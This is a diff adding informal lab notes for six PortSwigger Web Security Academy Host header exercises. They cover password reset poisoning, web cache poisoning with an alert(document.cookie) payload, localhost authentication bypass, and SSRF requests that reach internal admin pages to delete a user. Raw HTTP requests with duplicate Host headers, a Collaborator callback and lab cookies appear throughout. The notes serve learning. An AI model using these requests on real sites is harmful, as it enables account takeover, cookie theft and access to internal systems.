@@ -1,0 +1,96 @@
+1. Basic password reset poisoning
+
+	this time go to the login page then go forgot password and observe that u have a password reset 
+	link then change the username in http request to victim and and repeat the request and change host
+	header url to malicious url so if it is vulnerable to host header attack then then password reset 		link will be sent to Attackers own website
+
+2. Password reset poisoning via dangling markup
+
+	type here the malicious url
+	Host: vulnerable-website-url:'<a href="//malicious-url-will-be-here/? 
+
+3. Web cache poisoning via ambiguous requests
+
+	here when we added a random parameter like ?cb=1sfd then in the response we can see there is 
+	a Response Header X-Cache: hit or miss that means it is vulnerable for host header attack
+	 Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie). Store the exploit and copy the domain name for your exploit server. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this: GET /?cb=123 HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Host: your exploit-server-id.web-security-academy.net
+
+	exploit path: /resources/js/tracking.js
+	store here the xss in hacker malicious website
+	
+GET / HTTP/1.1
+Host: ace61ff41e1213ed80aa89f60088008c.web-security-academy.net
+Host: ace01f051ed713ce803a89a3014f00f2.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
+Connection: close
+Cookie: _lab=46%7cMCwCFDUeYnKbHS4QKhrTNedQkznG4FBWAhRH6d0xf8AyFDyVSe9P8T263ONtZIfNBnuiOUnPwNLx%2boBd3CM3aeyECuEoyma2FmZ%2bHkyuRpkR%2f1LT2BHY7lnEv8v0anbtC%2f3ybxtANgj4XvUTOolGwsFM%2fdN4gx7jVlhUBrvKulqvfsk%3d
+Upgrade-Insecure-Requests: 1
+
+	
+
+4. Host header authentication bypass
+
+	this time if we want to be at admin interface we can search by robot.txt and we can then 
+	change the Host as
+	
+	Host: locahost
+
+	so that we can access to the admin interface
+
+5. Routing-based SSRF
+
+	we can send it to repeater than we can change the Host: 192.168.0.&0& if this hit the internal
+	server then we can add the /admin and fetch admin session id from the reponse and we can add
+	 the session:jLJIweqiIjf into the cookie header so that we can also observe that here is a path
+	where we can delete user carlos. that is /admin/delete/
+	?csrf=JjlfsaueihGDshahUI9Gasf&username=carlos
+
+
+6. SSRF via flawed request parsing
+
+step 1.
+
+GET https://ac3e1ff71f03e40780f422b400430006.web-security-academy.net/ HTTP/1.1
+Host: 0ijig9l604pkinzg0cv39jcqvh17pw.burpcollaborator.net
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing
+Connection: close
+Cookie: _lab=46%7cMCwCFGqRyzR0mvPUNo4Ig71t75U0qO6PAhR5kNwB%2bN00XDtLY04tE27lP2HfMBZyGKRKvuJFCXDxpS1eT6qakzNNa4Q7RkUC3iL7AksbTS4Pbsf51NoVb5ZiFFMtVvhRtc%2fYXXn%2bKDWuQH458AwbD0lSN6IYO4MYjv55tLsCdPW1HFM%3d; session=8L9DozfgEfnYLmxsC3mjfTT9feWsHPHG
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+response.
+
+HTTP/1.1 200 OK
+Server: Burp Collaborator https://burpcollaborator.net/
+X-Collaborator-Version: 4
+Content-Type: text/html
+Connection: close
+Content-Length: 53
+
+<html><body>aqjxp7qz8lv9ltonj68vzbzjigz</body></html>
+
+then send it to intruder
+
+step 2. 
+GET https://ac3e1ff71f03e40780f422b400430006.web-security-academy.net/admin/delete?csrf=umAUFygrlbEsSyo9jMcfitoTBQ3rgLMa&username=carlos HTTP/1.1
+Host: 192.168.0.96
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing
+Connection: close
+Cookie: _lab=46%7cMCwCFGqRyzR0mvPUNo4Ig71t75U0qO6PAhR5kNwB%2bN00XDtLY04tE27lP2HfMBZyGKRKvuJFCXDxpS1eT6qakzNNa4Q7RkUC3iL7AksbTS4Pbsf51NoVb5ZiFFMtVvhRtc%2fYXXn%2bKDWuQH458AwbD0lSN6IYO4MYjv55tLsCdPW1HFM%3d; session=8L9DozfgEfnYLmxsC3mjfTT9feWsHPHG
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
